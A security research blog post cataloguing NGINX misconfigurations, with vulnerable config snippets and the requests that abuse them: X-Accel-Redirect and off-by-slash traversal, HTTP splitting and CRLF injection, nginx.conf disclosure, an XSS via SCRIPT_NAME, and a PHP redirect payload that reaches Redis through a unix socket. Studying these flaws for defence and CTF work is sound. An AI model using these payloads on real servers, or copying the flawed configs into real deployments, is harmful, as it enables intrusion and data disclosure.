---
layout: post
title: NGiNX configurations of doom
category: research
date: 23/11/2021
tags:
  - WIP
  - research
  - nginx
  - misconfigurations
  - hacking
---

# NGiNX configurations of doom
This document will serve as the log for researching various NGiNX configurations, how they can be avoided and how they can me leveraged from an offensive security standpoint -- and in the mean time maybe create a couple of targets for echoCTF.RED 😆


## Accessing `internal` blocks
These blocks define rules that a given location can only be used for internal requests. For external requests, the client error `404 (Not Found)` is returned. Internal requests are the following:
* requests redirected by the `error_page`, `index`, `random_index`, and `try_files` directives;
* requests redirected by the `X-Accel-Redirect` response header field from an upstream server;
* subrequests formed by the `include virtual` command of the `ngx_http_ssi_module` module, by the `ngx_http_addition_module` module directives, and by `auth_request` and mirror directives;
* requests changed by the `rewrite` directive.


By using the `X-Accel-Redirect` response header, we can make Nginx redirect internally to serve another config block, even ones marked with the internal directive:
```nginx
location /internal_only/ {
    internal;
    root /var/www/html/internal/;
}
```

(untested) You can access this block with something like the following request to `curl -H "X-Accel-Redirect: /internal_only/file" http://target/`

## Accessing `localhost` restricted blocks

By using a hostname with a DNS A pointer to 127.0.0.1, we can make Nginx redirect internally to blocks allowing localhost only:
```nginx
location /localhost_only/ {
    deny all;
    allow localhost;
    root /var/www/html/internal/;
}
```

## Multiple Slashes bypass
Multiple slashes could cause applications to fail. One of the mechanisms that nginx provides to address that is the use of the `merge_slashes` parameter.

> The parameter enables or disables compression of two or more adjacent slashes in a URI into a single slash.
> -- http://nginx.org/en/docs/http/ngx_http_core_module.html#merge_slashes

This is particularly useful in order to make sure `locations` keep on matching for the same location with or without multiple slashes, such as that it treats `/test`, `//test`,  `///test///` as equal paths of **`/test`**.

However, what the documentation does not make clear is that your request is not going to be normalized. This compression only happens internally with nginx and is used to match locations and other regular expressions associated with the request.

A live example from a similar bug we had caused error 500 to be produced if a URL like this was requested `https://echoctf.red//some/some/index.php?a=a&b=b`, by messing up the request and root path.  The vulnerable snippet looked like this
```
location / {
  index index.html index.php;
  try_files $uri $uri/ /index.php$is_args$args;
}

location ~ \.php$ {
  # try_files $uri =404;
  fastcgi_split_path_info ^(.+\.php)(.*)$;
  proxy_pass 127.0.0.1:9001;
}
```

The fix for this case was to use the `try_files` inside the `location ~ \.php$ { ... }`. The setting of `merge_slashes` made **NO** difference `on` or `off`.

### Misconceptions
In situations such as that `proxy_pass` is also used these requests will travel to their destination as is. Many documents out there have understood its purpose and effect on a server configuration very wrong.
* [wrong merge_slashes operation](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d)
* [wrong merge_slashes operation](https://book.hacktricks.xyz/pentesting/pentesting-web/nginx#merge_slashes-set-to-off)


> The [merge_slashes](http://nginx.org/en/docs/http/ngx_http_core_module.html#merge_slashes) directive is set to “on” by default which is a mechanism to compress two or more forward slashes into one, so `///` would become `/`. If Nginx is used as a reverse-proxy and the application that’s being proxied is vulnerable to local file inclusion, using extra slashes in the request could leave room for exploit it. This is described in detail by [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).
>
> We found 33 Nginx configuration files with `merge_slashes` set to “off”.

Well to that I say:
> **Just because an application has `merge_slashes off` it doesn't mean its vulnerable!!!**
>  -- _databus_

## Server Side Request Forgery
[[ssrf] Server Side Request Forgery](https://github.com/yandex/gixy/blob/master/docs/en/plugins/ssrf.md)

## HTTP Splitting
[[http_splitting] HTTP Splitting](https://github.com/yandex/gixy/blob/master/docs/en/plugins/httpsplitting.md)

### Exploiting HTTP Splitting with cloud storage
One configuration you could do (hint: **don’t**) might look like this:

```
location ~ /docs/(\[^/\]\*/\[^/\]\*)? {
    proxy_pass https://bucket.s3.amazonaws.com/docs-website/$1.html;
}
```
**or**
```
location ~ /images([0-9]+)/([^\s]+) {
    proxy_pass https://s3.amazonaws.com/companyname-images$1/$2;
}
```

In this case, any URL under `yourdomain.com/docs/` would be served from S3. The regular expression states that `yourdomain.com/docs/help/contact-us` would fetch the S3-object located at:

```
https://bucket.s3.amazonaws.com/docs-website/help/contact-us.html
```

Now, the problem with this regular expression is that it also allows newlines per default. In this case, the `[^/]*` part actually also includes encoded newlines. And when the regular expression group is passed into proxy_pass, the group will be url-decoded. This means that the following request:

```
GET /docs/%20HTTP/1.1%0d%0aHost:non-existing-bucket1%0d%0a%0d%0a HTTP/1.1
Host: yourdomain.com
```

Would actually make the following request from the web server to S3:

```
GET /docs-website/ HTTP/1.1
Host:non-existing-bucket1

.html HTTP/1.0
Host: bucket.s3.amazonaws.com
```

In this case, any URL under yourdomain.com/docs/ would be served from S3. The
regular expression states that yourdomain.com/docs/help/contact-us would fetch
the S3-object located at: `https://bucket.s3.amazonaws.com/docs-website/help/contact-us.html`

Now, the problem with this regular expression is that it also allows newlines
per default. In this case, the [^/]* part actually also includes encoded
newlines. And when the regular expression group is passed into proxy_pass,
the group will be url-decoded. This means that the following request:

```
GET /docs/%20HTTP/1.1%0d%0aHost:non-existing-bucket1%0d%0a%0d%0a HTTP/1.1
Host: yourdomain.com
Would actually make the following request from the web server to S3:

GET /docs-website/ HTTP/1.1
Host:non-existing-bucket1

.html HTTP/1.0
Host: bucket.s3.amazonaws.com
```


## Problems with referrer/origin validation
[[origins] Problems with referrer/origin validation](https://github.com/yandex/gixy/blob/master/docs/en/plugins/origins.md)
### none in valid_referers
[[valid_referers] none in valid_referers](https://github.com/yandex/gixy/blob/master/docs/en/plugins/validreferers.md)

## Alias traversal
[[alias_traversal] Path traversal via misconfigured alias](https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md)
```
server {
    listen   83;
    server_name  "offbyslash";
    location /docs {
        alias /var/www/offbyslash/;
    }
}
```

## Messing up response headers
By default, when `add_header` is added to the configuration, this header is only returned on the following status codes `206, 301, 302, 303, 304, 307 (1.1.16, 1.0.13), or 308 (1.13.0)`

[[add_header_redefinition] Redefining of response headers by  "add_header" directive](https://github.com/yandex/gixy/blob/master/docs/en/plugins/addheaderredefinition.md)
[[add_header_multiline] Multiline response headers](https://github.com/yandex/gixy/blob/master/docs/en/plugins/addheadermultiline.md)

## HOST header request forgery
[[host_spoofing] Request's Host header forgery](https://github.com/yandex/gixy/blob/master/docs/en/plugins/hostspoofing.md)
```
server {
    listen   81;
    server_name  "backend";

    # Access socket
    location /backend {
        proxy_pass http://$host/?ETSCTF_PLACEHOLDER1;
    }
}
```
### Multiple `HOST` headers
NGiNX between v0.7.0 ~ v1.20 has had the silly idea to allow 2 `HOST` headers to be given on a request, due to a bug that existed in some java VM implementations on mobile phones, which was causing this behaviour. So as a temporary fix they allowed two `HOST` to be accepted.

However, this "logic" was not propagated across the code base and led to problems in a lot of different areas. NGiNX performs any validations and checks only on the first `HOST` header and sets the internal `http_host` variable to the **second**!!! Similarly, all exported variables passed to backend application servers (eg wsgi, fastcgi etc) are being overwritten by the second host. In some cases this can lead to cache poisoning, code injections and more.

## Erroneous `root` location
```
server {
    listen   80;
    server_name  "noroot";
    root /etc/nginx;

    location /index.html {
            try_files $uri $uri/ =404;
            proxy_pass http://127.0.0.1:8080/;
    }
}
```

## Missing root location
```
server {
        root /etc/nginx;

        location /hello.txt {
                try_files $uri $uri/ =404;
                proxy_pass http://127.0.0.1:8080/;
        }
}
```

The root directive specifies the root folder for Nginx. In the above example, the root folder is `/etc/nginx` which means that we can reach files within that folder. The above configuration does not have a location for `/ (location / {...})`, only for `/hello.txt`. Because of this, the `root` directive will be globally set, meaning that requests to `/` will take you to the local path `/etc/nginx`.

A request as simple as `GET /nginx.conf` would reveal the contents of the Nginx configuration file stored in `/etc/nginx/nginx.conf`. If the root is set to `/etc`, a `GET` request to `/nginx/nginx.conf` would reveal the configuration file.

## Off-By-Slash
```
server {
        listen 80 default_server;

        server_name _;

        location /static {
                alias /usr/share/nginx/static/;
        }

        location /api {
                proxy_pass http://apiserver/v1/;
        }
}
```
With the Off-by-slash misconfiguration, it is possible to traverse one step up the path due to a missing slash. Orange Tsai made this technique well known in his Blackhat talk [“Breaking Parser Logic!”](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) In this talk he showed how a missing trailing slash in the `location` directive combined with the `alias` directive can make it possible to read the source code of the web application. What is less well known is that this also works with other directives like `proxy_pass`. Let’s break down what is happening and why this works.
```
	location /api {
			proxy_pass http://apiserver/v1/;
	}
```
With an Nginx server running the following configuration that is reachable at `server`, it might be assumed that only paths under `http://apiserver/v1/` can be accessed.

```
http://server/api/user -> http://apiserver/v1//user
```

When `http://server/api/user` is requested, Nginx will first normalize the URL. It then looks to see if the prefix `/api` matches the URL, which it does in this case. The prefix is then removed from the URL so the path `/user` is left. This path is then added to the `proxy_pass` URL which results in the final URL `http://apiserver/v1//user`. Note that there is a double slash in the URL since the location directive does not end in a slash and the `proxy_pass` URL path ends with a slash. Most web servers will normalize `http://apiserver/v1//user` to `http://apiserver/v1/user`, which means that even with this misconfiguration everything will work as expected and it could go unnoticed.

This misconfiguration can be exploited by requesting `http://server/api../` which will result in Nginx requesting the URL `http://apiserver/v1/../` that is normalized to `http://apiserver/`. The impact that this can have depends on what can be reached when this misconfiguration is exploited. It could for example lead to the Apache server-status being exposed with the URL `http://server/api../server-status`, or it could make paths accessible that were not intended to be publicly accessible.

One sign that a Nginx server has this misconfiguration is the server still returns the same response when a slash in the URL is removed. For example, if both `http://server/api/user` and `http://server/apiuser` return the same response, the server might be vulnerable. This would lead to the following requests being sent:

```
http://server/api/user -> http://apiserver/v1//user
http://server/apiuser -> http://apiserver/v1/user
```

## Unsafe variable use

Some frameworks, scripts and Nginx configurations unsafely use the variables stored by Nginx. This can lead to issues such as XSS, bypassing HttpOnly-protection, information disclosure and in some cases even RCE.

## SCRIPT_NAME

With a configuration such as the following:
```
        location ~ \\.php$ {
                include fastcgi_params;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                fastcgi_pass 127.0.0.1:9000;
        }
```
The main issue will be that Nginx will send any URL to the PHP interpreter ending in `.php` even if the file doesn’t exist on disc. This is a common mistake in many Nginx configurations, as outlined in the “[Pitfalls and Common Mistakes](https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/#passing-uncontrolled-requests-to-php)” document created by Nginx.

An XSS will occur if the PHP-script tries to define a base URL based on `SCRIPT_NAME`;
```
<?php

if(basename($_SERVER\['SCRIPT_NAME'\]) ==
basename($_SERVER\['SCRIPT_FILENAME'\]))
   echo dirname($_SERVER\['SCRIPT_NAME'\]);

?>
```

```
GET /index.php/<script>alert(1)</script>/index.php
SCRIPT_NAME  =  /index.php/<script>alert(1)</script>/index.php
```

## Usage of $uri can lead to CRLF Injection

Another misconfiguration related to Nginx variables is to use `$uri` or `$document_uri` instead of `$request_uri`. `$uri` and `$document_uri` contain the normalized URI whereas the `normalization` in Nginx includes URL decoding the URI. [Volema](http://blog.volema.com/nginx-insecurities.html#header:~:text=Case%202%3A%20rewrite%20with%20%24uri%20(%24document_uri)) found that `$uri` is commonly used when creating redirects in the Nginx configuration which results in a CRLF injection.

An example of a vulnerable Nginx configuration is:
```
location / {
  return 302 https://example.com$uri;
}
```
The new line characters for HTTP requests are \\r (Carriage Return) and \\n (Line Feed). URL-encoding the new line characters results in the following representation of the characters `%0d%0a`. When these characters are included in a request like `http://localhost/%0d%0aDetectify:%20clrf` to a server with the misconfiguration, the server will respond with a new header named `Detectify` since the $uri variable contains the URL-decoded new line characters.
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```

Learn more about the risks of CRLF injection and response splitting at [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

## Any variable

In some cases, user-supplied data can be treated as an Nginx variable. It’s unclear why this may be happening, but it’s not that uncommon or easy to test for as seen in this [H1 report](https://hackerone.com/reports/370094). If we search for the error message, we can see that it is found in the [SSI filter module](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), thus revealing that this is due to SSI.

One way to test for this is to set a referer header value:
```
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
We scanned for this misconfiguration and found several instances where a user could print the value of Nginx variables. The number of found vulnerable instances has declined which could indicate that this was patched.

## Raw backend response reading
With Nginx’s `proxy_pass`, there’s the possibility to intercept errors and HTTP headers created by the backend. This is very useful if you want to hide internal error messages and headers so they are instead handled by Nginx. Nginx will automatically serve a custom error page if the backend answers with one. But what if Nginx does not understand that it’s an HTTP response?

If a client sends an invalid HTTP request to Nginx, that request will be forwarded as-is to the backend, and the backend will answer with its raw content. Then, Nginx won’t understand the invalid HTTP response and just forward it to the client. Imagine a uWSGI application like this:
```
def application(environ, start_response):
   start_response('500 Error', \[('Content-Type',
'text/html'),('Secret-Header','secret-info')\])
   return \[b"Secret info, should not be visible!"\]
```
And with the following directives in Nginx:
```
http {
   error_page 500 /html/error.html;
   proxy_intercept_errors on;
   proxy_hide_header Secret-Header;
}
```
[proxy_intercept_errors](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors) will serve a custom response if the backend has a response status greater than 300. In our uWSGI application above, we will send a `500 Error` which would be intercepted by Nginx.

[proxy_hide_header](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header) is pretty much self explanatory; it will hide any specified HTTP header from the client.

If we send a normal `GET` request, Nginx will return:
```
HTTP/1.1 500 Internal Server Error
Server: nginx/1.10.3
Content-Type: text/html
Content-Length: 34
Connection: close
```
But if we send an invalid HTTP request, such as:
```
GET /? XTTP/1.1
Host: 127.0.0.1
Connection: close
```
We will get the following response:
```
XTTP/1.1 500 Error
Content-Type: text/html
Secret-Header: secret-info
```
Secret info, should not be visible!


## Proxy requests

### Controlling `proxy_pass` host
In some setups, a matching path is used as part of the hostname to proxy the request to such as the following examples.
```
location /backend {
  proxy_pass http://$host; # To repeat: don't do this!
}

location ~ /static/(.\*)/(.\*) {
  proxy_pass   http://$1-example.s3.amazonaws.com/$2;
}
```

In this case, any URL under `yourdomain.com/static/js/` would be served from S3, in the corresponding `js-example` bucket. The regular expression states that `yourdomain.com/static/js/app-1555347823-min.js` would fetch the S3-object located at: `http://js-example.s3.amazonaws.com/app-1555347823-min.js`.

Since the bucket is attacker controlled (part of the URI path), this leads to XSS but also has further implications.

### Accessing HTTP speaking sockets (`.sock`)
The proxy_pass feature in Nginx supports proxying requests to local unix sockets. What might be surprising is that the URI given to proxy_pass can be prefixed with `http://` or as a UNIX-domain socket path specified after the word `unix` and enclosed in colons:
```
proxy_pass   http://unix:/tmp/backend.sock:/uri/;
```

To see if this was possible, we set up a local Unix socket using `socat` and an Nginx server configured with the bug:

```
$ socat UNIX-LISTEN:/tmp/mysocket STDOUT
```

```
location ~ /static/(.\*)/(.\*.js) {
    proxy_pass   http://$1\-example.s3.amazonaws.com/$2;
}
```

For this request:
```
GET /static/unix:%2ftmp%2fmysocket:TEST/app-1555347823-min.js HTTP/1.1
Host: example.com
```

The socket receives this information:
```
GET TEST\-example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
Host: localhost
Connection: close
```

Now, we can take this a step further. If you want the proxy_pass to follow redirects instead of reflecting it, there’s no setting for that. However, a lot of examples (hello StackOverflow) show that you could do the following (hint: don’t):
```
location ~ /images(.*) {
    proxy_intercept_errors on;
    proxy_pass   http://example.com$1;
    error_page 301 302 307 303 = @handle_redirects;
}
location @handle_redirects {
    set $original_uri $uri;
    set $orig_loc $upstream_http_location;
    proxy_pass $orig_loc;
}
```

This basically says that if the origin host responds with status `301`, it will use the location-header and pass it into another proxy_pass inside the @handle_redirects. This means that if this sort of rewrite is made, and an open redirect exists at the origin, we control the full part of proxy_pass. This however requires the origin host to redirect when we are using the EVAL HTTPmethod, but as shown above, if we can make the request point to our malicious origin, we can make sure it will also redirect an EVAL request back to the unix-socket:
```
error_page 404 405 =301 @405;
location @405 {
  try_files /index.php?$args /index.php?$args;
}
```

```php
<?
header('Location: http://unix:/tmp/redis.sock:\\'return (table.concat(redis.call("config","get","\*"),"\\n").." HTTP/1.1 200 OK\\r\\n\\r\\n")\\' 1 ', true, 301);
```


## References
* https://portswigger.net/daily-swig/nginx-server-misconfigurations-found-in-the-wild-that-expose-websites-to-attacks
* https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/
* https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/
* https://github.com/yandex/gixy
* https://book.hacktricks.xyz/pentesting/pentesting-web/nginx